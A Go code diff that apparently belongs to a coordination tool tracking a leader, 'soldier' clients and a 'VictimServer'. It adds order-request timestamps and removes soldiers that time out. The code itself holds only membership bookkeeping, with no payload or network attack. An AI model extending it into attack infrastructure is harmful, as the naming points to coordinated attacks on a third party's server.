@@ -1,6 +1,10 @@
 package camp
 
-import "sync"
+import (
+	"log"
+	"sync"
+	"time"
+)
 
 type Client struct {
 	Name string `json:"name"`
@@ -11,7 +15,8 @@ type Leader struct {
 }
 type Soldier struct {
 	Client
-	Ip string
+	Ip                   string
+	LastOrderRequestTime time.Time
 }
 
 var instance *Camp
@@ -54,9 +59,9 @@ func (c *Camp) AddSoldier(s Soldier) {
 	c.Soldiers = append(c.Soldiers, s)
 }
 
-func (c *Camp) RemoveSoldier(ip string) bool {
+func (c *Camp) RemoveSoldier(name string) bool {
 	for i, sl := range c.Soldiers {
-		if sl.Ip == ip {
+		if sl.Name == name {
 			c.Soldiers = append(c.Soldiers[:i], c.Soldiers[i+1:]...)
 			return true
 		}
@@ -64,11 +69,62 @@ func (c *Camp) RemoveSoldier(ip string) bool {
 	return false
 }
 
-func (c *Camp) IsSoldierInCamp(ip string) bool {
+func (c *Camp) IsSoldierInCamp(name string) bool {
 	for _, sl := range c.Soldiers {
-		if sl.Ip == ip {
+		if sl.Name == name {
 			return true
 		}
 	}
 	return false
+}
+
+func (c Camp) Equals(other Camp) bool {
+	if c.VictimServer != other.VictimServer {
+		return false
+	}
+	if c.Leader.Name != other.Leader.Name {
+		return false
+	}
+	if len(c.Soldiers) != len(other.Soldiers) {
+		return false
+	}
+	for i, sl := range c.Soldiers {
+		if sl.Name != other.Soldiers[i].Name {
+			return false
+		}
+	}
+	return true
+}
+
+func (c *Camp) GetSoldier(name string) *Soldier {
+	for i, sl := range c.Soldiers {
+		if sl.Name == name {
+			return &c.Soldiers[i]
+		}
+	}
+	return nil
+}
+
+func (s *Soldier) isTimeOutedSoldier() bool {
+	if s.LastOrderRequestTime.IsZero() {
+		s.LastOrderRequestTime = time.Now()
+	}
+	return time.Now().Sub(s.LastOrderRequestTime) > 5*time.Second
+}
+
+func (s *Soldier) UpdateLastOrderRequestTime() {
+	(*s).LastOrderRequestTime = time.Now()
+}
+
+func (c *Camp) ScanAndRemoveTimeOutedSoldiers() {
+	for _, sl := range c.Soldiers {
+		log.Println("Soldier ", sl.Name, " last order request time: ", sl.LastOrderRequestTime)
+		if sl.isTimeOutedSoldier() {
+			c.RemoveSoldier(sl.Name)
+			log.Printf("Soldier %s is timeouted and removed from camp", sl.Name)
+		}
+	}
+}
+func (s *Soldier) GetLastOrderRequestTime() time.Time {
+	return s.LastOrderRequestTime
 }
